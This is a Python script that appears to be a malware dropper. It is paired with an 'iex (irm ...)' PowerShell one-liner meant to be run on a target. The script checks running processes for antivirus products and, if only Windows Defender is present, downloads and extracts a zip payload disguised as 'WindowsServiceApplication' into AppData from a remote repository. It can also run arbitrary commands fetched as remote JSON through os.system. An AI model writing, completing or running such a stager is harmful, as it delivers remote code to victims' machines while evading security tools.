'''
#iex (irm "https://example.com/script.ps1")
First just point the target by writing it to powershell terminal
    the pastebin will contain the powershell commands
        download the python to exe converted file that will manage the payload
'''


import os, sys
import requests
import shutil
import json, psutil
from rich.console import Console


console = Console()
global folder_, logConsole

# import module
sys.path.append(r"D:\Python\ASUS\GodsEye")
#from masterlib import download_file, startDownloading # downloads file from internet
from printer_ import green_circle, red_circle, yellow_circle

commands_url = [
    'https://raw.githubusercontent.com/Miraj-Al-Mahmud/Shinigami/refs/heads/main/commands.json'
]
logConsole = True
detected = {}
zipFileName = 'WindowsServiceApplication.zip'
exe_ = 'WindowsServiceApplication.exe'
folder_ = 'WindowsServiceApplication'
jsonFile = 'commands.json'
payload_ = folder_ + f'\\{exe_}'
# have to use raw url
urls = [
    "https://raw.githubusercontent.com/Miraj-Al-Mahmud/Shinigami/refs/heads/main/WindowsServiceApplication.zip", # the payloads

]



def note(string_, end_ = '\n') -> None:
    standard_distance = '\t'
    if logConsole:
        console.print(f"{standard_distance}{string_}",end = end_)


def readJSON(filename:str) -> dict:
    with open(filename, 'r+') as file_:
        global raw_data
        raw_data = json.load(file_)
        assert type(raw_data) == dict
        

def get_running_process():
    processlist = list()
    for process in psutil.process_iter(): processlist.append(process.name())
    return processlist

getFileNameFromUrl = lambda name_ : str(name_.rsplit('/')[-1])
relative_path = lambda query = str : os.path.join(os.path.expanduser('~'), f'{query}')
extractZip = lambda zipName, destFolder : shutil.unpack_archive(zipName, destFolder)



def startDownloading() :
    note(f"[bright_blue b]Download started !")
    for idx,u_ in enumerate(urls):
        foo_ = download_file(u_)
        note(F'[right_yellow b]{idx+1} {getFileNameFromUrl(foo_[1])}')

def avs():
    p_ = get_running_process()
    for k,v in raw_data['av'].items():
        for vv in v:
            if vv in p_:
                detected[k] = v
                break

    keys_ = [i for i in detected.keys()]
    if len(keys_) == 1 and 'Windows Defender' in keys_:
        yield True
    else:
        yield False

def download_file(url : str) -> list[bool, any]:
    try:

        save_path = url.split('/')[-1]
        
        response = requests.get(url, stream=True)
        response.raise_for_status()
        
        with open(save_path, 'wb') as file:
            for chunk in response.iter_content(chunk_size=8192):
                file.write(chunk)
        
        return [True, url]

    except Exception as ex__: return [False, ex__]

def windowsModifier() -> None:
    # just run the compiled EXE - runs as Admin
    dick = readJSON('commands.json')
    for _item in dick['run']:
        try:
            x = os.system(_item)
            if x == 0: note(F'[bright_green i b]Success !')
        except Exception as ex__:
            note(F'[bright_red i b]{ex__}')
    # it will automatically read the commands from the commands.json

"""
Make folders and download files for pre - execution modules
"""
def accomodate() -> None:

    # download the necessary files
    for i in commands_url:
        first_ = download_file(i)
        note(first_)

    # change the directory to AppData \ Local \ WindowsServiceApplication
    path__ = relative_path('AppData') + r'\Local'
    os.chdir(path__)
    os.system('mkdir WindowsServiceApplication')
    os.chdir(r'.\WindowsServiceApplication')


getToThePoint = lambda : os.startfile(payload_)

def main() -> None:

    #windowsModifier() # Microsoft Windows Defender Only
    _flag = avs()
    if _flag:
        # only Windows Defender
        note(f'[blink]{green_circle}[/] [bright_green b]Running Windows Defender [bright_yellow] Proceeding ...')
        startDownloading() # download the payloads
        extractZip(zipFileName, folder_) # extract
        #getToThePoint()
    else:
        # exit()
        note(f'[bright_magenta b]Other Applications Present')
    
    

if __name__ == "__main__":
    

    accomodate()
    readJSON(jsonFile)

    main()
    